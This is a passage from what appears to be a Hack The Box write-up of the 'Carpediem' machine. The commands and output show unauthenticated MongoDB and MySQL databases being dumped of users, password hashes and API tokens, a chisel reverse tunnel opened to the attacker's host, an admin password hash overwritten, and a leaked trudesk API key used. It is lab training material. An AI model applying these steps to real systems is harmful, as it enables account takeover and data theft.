Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 752
Server version: 8.0.27 MySQL Community Server - GPL

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

```

The only DB is `portal`:

```

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| portal             |
+--------------------+
2 rows in set (0.09 sec)

```

It has a few tables:

```

mysql> use portal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------+
| Tables_in_portal |
+------------------+
| bike_list        |
| brand_list       |
| categories       |
| file_list        |
| rent_list        |
| system_info      |
| users            |
+------------------+
7 rows in set (0.09 sec)

```

It has only the user from `initialize.php` and the one I created:

```

mysql> select * from users;
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
| id | firstname | lastname | gender | contact                | username | password                         | address | avatar                            | last_login | login_type | date_added          | date_updated        |
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
|  1 | Jeremy    | Hammond  | Male   | jhammond@carpediem.htb | admin    | b723e511b084ab84b44235d82da572f3 |         | uploads/1635793020_HONDA_XADV.png | NULL       |          1 | 2021-01-20 14:02:37 | 2022-04-01 23:34:50 |
| 25 | 0xdf      | 0xdf     | Male   | 0xdf@carpediem.htb     | 0xdf     | 465e929fc1e0853025faad58fc8cb47d | 0xdf    | NULL                              | NULL       |          1 | 2022-11-28 15:20:42 | 2022-11-28 17:27:53 |
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
2 rows in set (0.08 sec)

```

#### 172.17.0.4 - MongoDB

This host is open on 27017, which is the default port for MongoDB. I could also get that by curling the port:

```

oxdf@hacky$ proxychains curl 172.17.0.4:27017
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.4:27017  ...  OK
It looks like you are trying to access MongoDB over HTTP on the native driver port.

```

I’ll connect using `mongo`, and it allows access without auth:

```

oxdf@hacky$ proxychains mongo 172.17.0.4
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
MongoDB shell version v3.6.8
connecting to: mongodb://172.17.0.4:27017/test
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.4:27017  ...  OK
Implicit session: session { "id" : UUID("f87fa546-0593-42c5-b3a5-e6d1dff06a7f") }
MongoDB server version: 5.0.6
WARNING: shell and server versions do not match
Server has startup warnings: 
{"t":{"$date":"2022-11-28T13:57:33.732+00:00"},"s":"I",  "c":"STORAGE",  "id":22297,   "ctx":"initandlisten","msg":"Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem","tags":["startupWarnings"]}
{"t":{"$date":"2022-11-28T13:57:36.570+00:00"},"s":"W",  "c":"CONTROL",  "id":22120,   "ctx":"initandlisten","msg":"Access control is not enabled for the database. Read and write access to data and configuration is unrestricted","tags":["startupWarnings"]}
> 

```

There are four DBs (though only `trudesk` isn’t a [default one](https://www.mysoftkey.com/mongodb/3-default-database-in-mongodb/)):

```

> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
trudesk  0.001GB

```

There’s a bunch of collections in the `trudesk` database:

```

> use trudesk
switched to db trudesk
> show collections
accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes

```

There are four accounts:

```

> db.accounts.find()
{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS", "fullname" : "Robert Frost", "email" : "rfrost@carpediem.htb", "role" : ObjectId("623c8b20855cc5001a8ba138"), "title" : "Sr. Network Engineer", "accessToken" : "22e56ec0b94db029b07365d520213ef6f5d3d2d9", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:30:32.198Z") }
{ "_id" : ObjectId("6243c0be1e0d4d001b0740d4"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jhammond", "email" : "jhammond@carpediem.htb", "password" : "$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq", "fullname" : "Jeremy Hammond", "title" : "Sr. Systems Engineer", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "a0833d9a06187dfd00d553bd235dfe83e957fd98", "__v" : 0, "lastOnline" : ISODate("2022-04-01T23:36:55.940Z") }
{ "_id" : ObjectId("6243c28f1e0d4d001b0740d6"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jpardella", "email" : "jpardella@carpediem.htb", "password" : "$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK", "fullname" : "Joey Pardella", "title" : "Desktop Support", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "7c0335559073138d82b64ed7b6c3efae427ece85", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:33:20.918Z") }
{ "_id" : ObjectId("6243c3471e0d4d001b0740d7"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "acooke", "email" : "acooke@carpediem.htb", "password" : "$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.", "fullname" : "Adeanna Cooke", "title" : "Director - Human Resources", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "9c7ace307a78322f1c09d62aae3815528c3b7547", "__v" : 0, "lastOnline" : ISODate("2022-03-30T14:21:15.212Z") }
{ "_id" : ObjectId("6243c69d1acd1559cdb4019b"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "svc-portal-tickets", "email" : "tickets@carpediem.htb", "password" : "$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW", "fullname" : "Portal Tickets", "title" : "", "role" : ObjectId("623c8b20855cc5001a8ba13a"), "accessToken" : "f8691bd2d8d613ec89337b5cd5a98554f8fffcc4", "__v" : 0, "lastOnline" : ISODate("2022-03-30T13:50:02.824Z") }

```

Those are bcrypt hashes, and they don’t crack in any reasonable amount of time (typically on HTB if something doesn’t crack in 5-10 minutes, that’s not the intended way).

I’ll enumerate these further in a bit.

#### 172.17.0.5 - trudesk
172.17.0.5 is open on 8118. This is an unusual port. Trying it with `nc` doesn’t show much, but it works over HTTP. It’s a trudesk login form:

![image-20221128163245341](https://0xdfimages.gitlab.io/img/image-20221128163245341.png)

I’ve seen trudesk mentions a few times now, first in the admin panel, and then in the MongoDB. [trudesk](https://trudesk.io/) is a free ticket management system.

I don’t have a username / password to log in with.

### Read trudesk Tickets

There are a few different ways to access the trudesk tickets to get the necessary information to move to the next step. I’ll look at the content of the tickets after showing the different ways to get access.

#### From MongoDB

I can see the tickets from Mongo:

```

> db.tickets.find()
{ "_id" : ObjectId("624461a6f2c8c07f687ba8a6"), "deleted" : false, "status" : 1, "tags" : [ ], "subscribers" : [ ObjectId("6243c0be1e0d4d001b0740d4") ], "subject" : "Security risks - Portal", "group" : ObjectId("6244610ff2c8c07f687ba8a4"), "type" : ObjectId("623c8b20855cc5001a8ba136"), "priority" : ObjectId("623c8b24645f88065a113d69"), "issue" : "<p>We need to patch the user profile and admin sections of our Portal ASAP. Why are we continually pushing out functions that haven&#39;t been tested by the Infosec team?</p>\n", "date" : ISODate("2022-03-30T13:56:54.294Z"), "comments" : [ { "deleted" : false, "_id" : ObjectId("624464af559617846833092f"), "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:09:51.703Z"), "comment" : "<p>Thanks, Jeremy.  I agree.  This is a big problem.</p>\n" } ], "notes" : [ ], "attachments" : [ ], "history" : [ { "_id" : ObjectId("624461a6f2c8c07f687ba8a7"), "action" : "ticket:created", "description" : "Ticket was created.", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T13:56:54.301Z") }, { "_id" : ObjectId("624461bb8fc3556ae8715b0d"), "action" : "ticket:update:subject", "description" : "Ticket Subject was updated.", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T13:57:15.546Z") }, { "_id" : ObjectId("624461bb8fc3556ae8715b0e"), "action" : "ticket:update:issue", "description" : "Ticket Issue was updated.", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T13:57:15.559Z") }, { "_id" : ObjectId("6244640b5596178468330928"), "action" : "ticket:set:assignee", "description" : "Jeremy Hammond was set as assignee", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-03-30T14:07:07.789Z") }, { "_id" : ObjectId("6244648a559617846833092e"), "action" : "ticket:set:status", "description" : "status set to: 1", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T14:09:14.064Z") }, { "_id" : ObjectId("624464af5596178468330930"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:09:51.708Z") } ], "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "uid" : 1004, "__v" : 4, "assignee" : ObjectId("6243c0be1e0d4d001b0740d4"), "updated" : ISODate("2022-03-30T14:09:51.706Z") }
{ "_id" : ObjectId("6244635c8fc3556ae8715b0f"), "deleted" : false, "status" : 3, "tags" : [ ], "subscribers" : [ ObjectId("6243c28f1e0d4d001b0740d6"), ObjectId("6243c0be1e0d4d001b0740d4") ], "subject" : "Username change", "group" : ObjectId("6243c6601acd1559cdb40198"), "type" : ObjectId("623c8b20855cc5001a8ba136"), "priority" : ObjectId("623c8b24645f88065a113d68"), "issue" : "<p>I need a handle, man.  I mean, I don&#39;t have an identity until I have a handle.<br />How about The Master of Disaster?</p>\n", "date" : ISODate("2022-03-30T14:04:12.953Z"), "comments" : [ { "deleted" : false, "_id" : ObjectId("6244644e559617846833092b"), "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T14:08:14.846Z"), "comment" : "<p>You&#39;re hopelss, man.  Utterly hopeless.</p>\n<p>I&#39;m closing this ticket.</p>\n" } ], "notes" : [ ], "attachments" : [ ], "history" : [ { "_id" : ObjectId("6244635c8fc3556ae8715b10"), "action" : "ticket:created", "description" : "Ticket was created.", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-03-30T14:04:12.960Z") }, { "_id" : ObjectId("6244642b559617846833092a"), "action" : "ticket:set:assignee", "description" : "Jeremy Hammond was set as assignee", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-03-30T14:07:39.053Z") }, { "_id" : ObjectId("6244644e559617846833092c"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T14:08:14.857Z") }, { "_id" : ObjectId("62446460559617846833092d"), "action" : "ticket:set:status", "description" : "status set to: 3", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T14:08:32.834Z") } ], "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "uid" : 1005, "__v" : 3, "assignee" : ObjectId("6243c0be1e0d4d001b0740d4"), "updated" : ISODate("2022-03-30T14:08:14.856Z") }
{ "_id" : ObjectId("624465135596178468330932"), "deleted" : false, "status" : 2, "tags" : [ ], "subscribers" : [ ObjectId("6243c3471e0d4d001b0740d7"), ObjectId("6243c28f1e0d4d001b0740d6") ], "subject" : "New employee on-boarding - Horace Flaccus", "group" : ObjectId("6243c6601acd1559cdb40198"), "type" : ObjectId("623c8b20855cc5001a8ba137"), "priority" : ObjectId("623c8b24645f88065a113d68"), "issue" : "<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>\n", "date" : ISODate("2022-03-30T14:11:31.501Z"), "comments" : [ { "deleted" : false, "_id" : ObjectId("624465512142479dd493d9ce"), "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:12:33.060Z"), "comment" : "<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n" }, { "deleted" : false, "_id" : ObjectId("624465562142479dd493d9d2"), "owner" : ObjectId("6243c3471e0d4d001b0740d7"), "date" : ISODate("2022-03-30T14:12:38.123Z"), "comment" : "<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>\n" }, { "deleted" : false, "_id" : ObjectId("6244655f2142479dd493d9d5"), "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:12:47.277Z"), "comment" : "<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>\n" } ], "notes" : [ ], "attachments" : [ ], "history" : [ { "_id" : ObjectId("624465135596178468330933"), "action" : "ticket:created", "description" : "Ticket was created.", "owner" : ObjectId("6243c3471e0d4d001b0740d7"), "date" : ISODate("2022-03-30T14:11:31.504Z") }, { "_id" : ObjectId("624465232142479dd493d9cb"), "action" : "ticket:set:status", "description" : "status set to: 1", "owner" : ObjectId("6243c3471e0d4d001b0740d7"), "date" : ISODate("2022-03-30T14:11:47.318Z") }, { "_id" : ObjectId("6244652d2142479dd493d9cd"), "action" : "ticket:set:assignee", "description" : "Joey Pardella was set as assignee", "owner" : ObjectId("6243c3471e0d4d001b0740d7"), "date" : ISODate("2022-03-30T14:11:57.663Z") }, { "_id" : ObjectId("624465512142479dd493d9cf"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:12:33.072Z") }, { "_id" : ObjectId("624465562142479dd493d9d3"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("6243c3471e0d4d001b0740d7"), "date" : ISODate("2022-03-30T14:12:38.124Z") }, { "_id" : ObjectId("6244655f2142479dd493d9d6"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:12:47.277Z") }, { "_id" : ObjectId("6244657a2142479dd493d9d9"), "action" : "ticket:set:status", "description" : "status set to: 2", "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-03-30T14:13:14.794Z") } ], "owner" : ObjectId("6243c3471e0d4d001b0740d7"), "uid" : 1006, "__v" : 6, "assignee" : ObjectId("6243c28f1e0d4d001b0740d6"), "updated" : ISODate("2022-03-30T14:12:47.277Z") }
{ "_id" : ObjectId("6244673c2142479dd493d9da"), "deleted" : false, "status" : 1, "tags" : [ ], "subscribers" : [ ObjectId("6243c0be1e0d4d001b0740d4") ], "subject" : "Trudesk API access - Portal", "group" : ObjectId("6244610ff2c8c07f687ba8a4"), "type" : ObjectId("623c8b20855cc5001a8ba137"), "priority" : ObjectId("623c8b24645f88065a113d67"), "issue" : "<p>I&#39;ll be looking into tightenting up security permissions this week for the Trudesk integration in the Portal.  We&#39;ll need to also perform some threat modeling to find out where our weak points are and come up with an action plan to mitigate.</p>\n", "date" : ISODate("2022-03-30T14:20:44.538Z"), "comments" : [ ], "notes" : [ ], "attachments" : [ ], "history" : [ { "_id" : ObjectId("6244673c2142479dd493d9db"), "action" : "ticket:created", "description" : "Ticket was created.", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T14:20:44.545Z") }, { "_id" : ObjectId("62446749fe7050bdd65b48c4"), "action" : "ticket:set:status", "description" : "status set to: 1", "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "date" : ISODate("2022-03-30T14:20:57.567Z") }, { "_id" : ObjectId("62470f14eadb13001b66b62b"), "action" : "ticket:set:assignee", "description" : "Jeremy Hammond was set as assignee", "owner" : ObjectId("623c8b20855cc5001a8ba13c"), "date" : ISODate("2022-04-01T14:41:24.574Z") } ], "owner" : ObjectId("6243c0be1e0d4d001b0740d4"), "uid" : 1007, "__v" : 2, "assignee" : ObjectId("6243c0be1e0d4d001b0740d4") }
{ "_id" : ObjectId("62478d83eadb13001b66b62c"), "deleted" : false, "status" : 0, "tags" : [ ], "subscribers" : [ ObjectId("6243c28f1e0d4d001b0740d6"), ObjectId("6243c0be1e0d4d001b0740d4") ], "subject" : "Need help building the CMS", "group" : ObjectId("6244610ff2c8c07f687ba8a4"), "type" : ObjectId("623c8b20855cc5001a8ba137"), "priority" : ObjectId("623c8b24645f88065a113d67"), "issue" : "<p>Hey Jeremy, <br />Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.</p>\n", "date" : ISODate("2022-04-01T23:40:51.552Z"), "comments" : [ { "deleted" : false, "_id" : ObjectId("62478e3a608eea1532bcd1b9"), "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-01T23:43:54.776Z"), "comment" : "<p>Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.<br>Build it out if you&#39;d like, but...just don&#39;t do anything stupid.</p>\n" }, { "deleted" : false, "_id" : ObjectId("624f49ca8576ce001bb6702e"), "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-07T20:30:02.359Z"), "comment" : "<p>Don&#39;t worry. I moved it off of the main server and into a container with SSL encryption.</p>\n" } ], "notes" : [ ], "attachments" : [ ], "history" : [ { "_id" : ObjectId("62478d83eadb13001b66b62d"), "action" : "ticket:created", "description" : "Ticket was created.", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-01T23:40:51.573Z") }, { "_id" : ObjectId("62478d94608eea1532bcd1b8"), "action" : "ticket:set:assignee", "description" : "Jeremy Hammond was set as assignee", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-01T23:41:08.431Z") }, { "_id" : ObjectId("62478e3a608eea1532bcd1ba"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-01T23:43:54.787Z") }, { "_id" : ObjectId("624f49ca8576ce001bb6702f"), "action" : "ticket:comment:added", "description" : "Comment was added", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-07T20:30:02.380Z") }, { "_id" : ObjectId("624f4a828576ce001bb67031"), "action" : "ticket:comment:updated", "description" : "Comment was updated: 624f49ca8576ce001bb6702e", "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "date" : ISODate("2022-04-07T20:33:06.175Z") } ], "owner" : ObjectId("6243c28f1e0d4d001b0740d6"), "uid" : 1008, "__v" : 4, "assignee" : ObjectId("6243c0be1e0d4d001b0740d4"), "updated" : ISODate("2022-04-07T20:30:02.374Z") }

```

The tickets are a bit of a pain to read directly from Mongo. For one, it’s all jammed on the screen. But also all the foreign objects are shown like `"owner" : ObjectId("623c8b20855cc5001a8ba13c")`, which means I can’t even copy this and pipe it to `jq` on my own system because these things aren’t valid JSON.

I’ll use `mongoexport` to get the results as pure JSON (and it fills out the pointers as well). I had some issues getting it to work over `proxychains`, so I’ll start another tunnel with `chisel`:

```

www-data@3c371615b7aa:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:27017:172.17.0.4:27017
2022/11/28 21:59:41 client: Connecting to ws://10.10.14.6:8000
2022/11/28 21:59:42 client: Connected (Latency 87.048435ms)

```

Now 27017 on my host forwards to 172.17.0.4:27017.

My initial run errors out:

```

oxdf@hacky$ mongoexport --host="127.0.0.1:27017" --db=trudesk --collection=tickets --out=tickets.json
2022-11-28T22:11:42.292+0000    connected to: 127.0.0.1:27017
2022-11-28T22:11:42.380+0000    Failed: BSON field 'FindCommandRequest.snapshot' is an unknown field.

```

[This](https://dba.stackexchange.com/a/226541) StackOverflow answer suggests `--forceTableScan`, and it works:

```

oxdf@hacky$ mongoexport --host="127.0.0.1:27017" --db=trudesk --collection=tickets --out=tickets.json --forceTableScan
2022-11-28T22:12:40.001+0000    connected to: 127.0.0.1:27017
2022-11-28T22:12:40.091+0000    exported 5 records

```

Looking at this, there’s a ton of uninteresting data mixed in with the tickets. I’ll use `jq` to get the `issue`, `uid`, and `comments`:

```

oxdf@hacky$ cat tickets.json | jq '{issue, uid, comments: [.comments | .[].comment]}'
{
  "issue": "<p>We need to patch the user profile and admin sections of our Portal ASAP. Why are we continually pushing out functions that haven&#39;t been tested by the Infosec team?</p>\n",
  "uid": 1004,
  "comments": [
    "<p>Thanks, Jeremy.  I agree.  This is a big problem.</p>\n"
  ]
}
{
  "issue": "<p>I need a handle, man.  I mean, I don&#39;t have an identity until I have a handle.<br />How about The Master of Disaster?</p>\n",
  "uid": 1005,
  "comments": [
    "<p>You&#39;re hopelss, man.  Utterly hopeless.</p>\n<p>I&#39;m closing this ticket.</p>\n"
  ]
}
{
  "issue": "<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>\n",
  "uid": 1006,
  "comments": [
    "<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n",
    "<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>\n",
    "<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>\n"
  ]
}
{
  "issue": "<p>I&#39;ll be looking into tightenting up security permissions this week for the Trudesk integration in the Portal.  We&#39;ll need to also perform some threat modeling to find out where our weak points are and come up with an action plan to mitigate.</p>\n",
  "uid": 1007,
  "comments": []
}
{
  "issue": "<p>Hey Jeremy, <br />Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.</p>\n",
  "uid": 1008,
  "comments": [
    "<p>Please don&#39;t expose that application publically.  I told you I would help when I had time and right now I&#39;m just too busy.<br>Build it out if you&#39;d like, but...just don&#39;t do anything stupid.</p>\n",
    "<p>Don&#39;t worry. I moved it off of the main server and into a container with SSL encryption.</p>\n"
  ]
}

```

Issue uid 1006 is what I need to continue.

#### Logging into trudesk

I don’t have creds for trudesk, but I have access to the database. I’ll get the hash for a password I know:

```

oxdf@hacky$ python3
Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import bcrypt
>>> bcrypt.hashpw( b'0xdf0xdf', bcrypt.gensalt(rounds=4))
b'$2b$04$p4DfSZ3YHjdBgs/9f.qWnOJq7.DEKBfGledDp2zJVfTKdJSFwllPK'

```

I’ll note that one of the users has username admin. I’ll update that account’s password hash to the newly generated one:

```

> db.accounts.update( {"username" : "admin" }, {$set: {"password": "$2b$04$p4DfSZ3YHjdBgs/9f.qWnOJq7.DEKBfGledDp2zJVfTKdJSFwllPK"} });
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

```

With it, I can log in and access the tickets:

![image-20221128172534600](https://0xdfimages.gitlab.io/img/image-20221128172534600.png)

I can access this using the Chisel socks proxy *or* by adding `trudesk.carpediem.htb` to my `/etc/hosts` file and then hitting it directly on port 80.

#### trudesk API

The intended path for the box is to look at the under development trudesk page in the admin panel. The page itself doesn’t have anything interesting, but there’s a `Trudesk.php` file in the `classes` folder:

```

www-data@3c371615b7aa:/var/www/html/portal/classes$ ls
DBConnection.php  Master.php          Trudesk.php  Zone.php
Login.php         SystemSettings.php  Users.php

```

It has an API token for trudesk:

```

<?php
class TrudeskConnection{

    private $host = 'trudesk.carpediem.htb';
    private $apikey = 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4';
    private $username = 'svc-portal-tickets';
    private $password = '';
    private $database = '';
    
}
?>

```

I’ll add `trudesk.carpediem.htb` to my `hosts` file, and I can now access it directly (without the proxy).

The [trudesk API docs](https://docs.trudesk.io/v1/api/#Get-2) are a bit weak. Under “Tickets”, the “Get” section is empty:

![image-20221129082931311](https://0xdfimages.gitlab.io/img/image-20221129082931311.png)

I could use “Get Single”, but I don’t have a `uid` value. I could fuzz that, but I’ll take a look at the [trudesk source](https://github.com/polonel/trudesk) first.

The API has both v1 and v2. Some experimentation shows that the token I have is not good for v2, so I’ll focus on v1. The routes are defined [here](https://github.com/polonel/trudesk/blob/master/src/controllers/api/v1/routes.js). I’ll focus on the ticket related routes:

[![image-20221129084359446](https://0xdfimages.gitlab.io/img/image-20221129084359446.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221129084359446.png)

The obvious choice is `/api/v1/tickets` (red), but that just returns an empty list for some reason:

```

oxdf@hacky$ curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -l http://trudesk.carpediem.htb/api/v1/tickets
[]

```

`/api/v1/tickets/search` (blue) could be interesting too. It’s slightly [documented](https://docs.trudesk.io/v1/api/#Search), but still doesn’t return anything for me:

```

oxdf@hacky$ curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -l 'http://trudesk.carpediem.htb/api/v1/tickets/search?search=a'
{"success":true,"error":null,"count":0,"totalCount":0,"tickets":[]}

oxdf@hacky$ curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -l 'http://trudesk.carpediem.htb/api/v1/tickets/search?search='
{"success":true,"error":null,"count":0,"totalCount":0,"tickets":[]}

oxdf@hacky$ curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -l 'http://trudesk.carpediem.htb/api/v1/tickets/search?search=*'
{"success":false,"error":"Error - Regular expression is invalid: nothing to repeat"}

oxdf@hacky$ curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -l 'http://trudesk.carpediem.htb/api/v1/tickets/search?search=.*'
{"success":true,"error":null,"count":0,"totalCount":0,"tickets":[]}

```

It seems clear from the third query that `*` is used as in regex to say zero or more, but even with `.*`, it returns nothing.

Going down the list, `/api/v1/tickets/stats` (orange) seems like it could help orient me, and it does:

```

oxdf@hacky$ curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -s -l http://trudesk.carpediem.htb/api/v1/tickets/stats | jq .
{
  "data": [],
  "ticketCount": 0,
  "closedCount": 0,
  "ticketAvg": null,
  "mostRequester": {
    "name": "Jeremy Hammond",
    "value": 2
  },
  "mostCommenter": {
    "name": "Robert Frost",
    "value": 3
  },
  "mostAssignee": {
    "name": "Jeremy Hammond",
    "value": 4
  },
  "mostActiveTicket": {
    "uid": 1006,
    "cSize": 7
  },
  "lastUpdated": "11-29-2022 08:47:45am"
}

```

I’ve got some usernames, as well as a ticket UID, 1006. I’ll pull that ticket, and it happens to be the one I need:

```

oxdf@hacky$ proxychains curl -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -l http://172.17.0.5:8118/api/v1/tickets/1006
{"success":true,"ticket":{"deleted":false,"status":2,"tags":[],"subscribers":[{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},{"_id":"6243c28f1e0d4d001b0740d6","username":"jpardella","email":"jpardella@carpediem.htb","fullname":"Joey Pardella","title":"Desktop Support","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}}],"_id":"624465135596178468330932","subject":"New employee on-boarding - Horace Flaccus","group":{"members":[],"sendMailTo":[],"public":false,"_id":"6243c6601acd1559cdb40198","name":"Desktop 